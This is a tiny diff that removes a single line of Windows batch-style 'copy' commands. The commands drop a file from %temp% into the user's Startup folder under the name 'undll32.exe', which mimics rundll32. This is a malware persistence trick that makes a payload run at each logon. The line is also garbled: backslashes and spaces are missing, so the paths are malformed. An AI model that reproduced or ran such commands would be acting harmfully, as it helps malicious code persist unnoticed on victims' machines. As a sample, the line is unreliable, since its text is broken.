@@ -1,1 +1,0 @@
-copy"%temp%undll32-.txt""%appdata%\Microsoft\Windows\StartMenu\Programs\Startupundll32.exe"copy"%temp%undll32-.txt""%temp%undll32.exe"
